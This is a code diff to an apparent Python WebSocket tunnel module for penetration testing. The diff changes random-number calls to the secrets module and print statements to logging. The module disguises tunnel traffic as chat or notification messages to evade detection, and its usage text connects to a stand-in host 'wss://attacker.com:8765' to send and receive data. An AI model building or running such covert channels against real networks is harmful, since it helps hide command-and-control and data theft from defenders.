@@ -12,7 +12,7 @@ import base64
 import hashlib
 import time
 import logging
-import random
+import secrets
 import os
 from typing import Dict, List, Optional, Any, Callable
 from dataclasses import dataclass, field
@@ -234,11 +234,11 @@ class WebSocketTunnel:
 
         # 伪装数据 (混淆流量特征)
         if self.config.disguise_as == "chat":
-            msg_dict["user"] = f"user_{random.randint(1000, 9999)}"
+            msg_dict["user"] = f"user_{secrets.randbelow(9000) + 1000}"
             msg_dict["room"] = "general"
         elif self.config.disguise_as == "notifications":
             msg_dict["notification_type"] = "update"
-            msg_dict["priority"] = random.choice(["low", "normal", "high"])
+            msg_dict["priority"] = secrets.choice(["low", "normal", "high"])
 
         return json.dumps(msg_dict)
 
@@ -572,21 +572,22 @@ async def example_client():
 
 
 if __name__ == "__main__":
-    print("WebSocket Tunnel Module")
-    print("=" * 50)
-    print(f"websockets available: {HAS_WEBSOCKETS}")
-    print(f"SSL available: {HAS_SSL}")
-    print("\n[!] This module is for authorized penetration testing only!")
-    print("\nFeatures:")
-    print("  - WSS encrypted connections")
-    print("  - XOR/AES data encryption")
-    print("  - Heartbeat keepalive")
-    print("  - Auto reconnect on failure")
-    print("  - Traffic disguise (chat/notifications/metrics)")
-    print("  - Chunked data transfer")
-    print("\nUsage:")
-    print("  config = WebSocketConfig(url='wss://attacker.com:8765', encryption_key='key')")
-    print("  tunnel = WebSocketTunnel(config)")
-    print("  await tunnel.connect()")
-    print("  await tunnel.send_data(b'data')")
-    print("  data = await tunnel.receive_data()")
+    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
+    logger.info("WebSocket Tunnel Module")
+    logger.info("=" * 50)
+    logger.info(f"websockets available: {HAS_WEBSOCKETS}")
+    logger.info(f"SSL available: {HAS_SSL}")
+    logger.warning("[!] This module is for authorized penetration testing only!")
+    logger.info("Features:")
+    logger.info("  - WSS encrypted connections")
+    logger.info("  - XOR/AES data encryption")
+    logger.info("  - Heartbeat keepalive")
+    logger.info("  - Auto reconnect on failure")
+    logger.info("  - Traffic disguise (chat/notifications/metrics)")
+    logger.info("  - Chunked data transfer")
+    logger.info("Usage:")
+    logger.info("  config = WebSocketConfig(url='wss://attacker.com:8765', encryption_key='key')")
+    logger.info("  tunnel = WebSocketTunnel(config)")
+    logger.info("  await tunnel.connect()")
+    logger.info("  await tunnel.send_data(b'data')")
+    logger.info("  data = await tunnel.receive_data()")
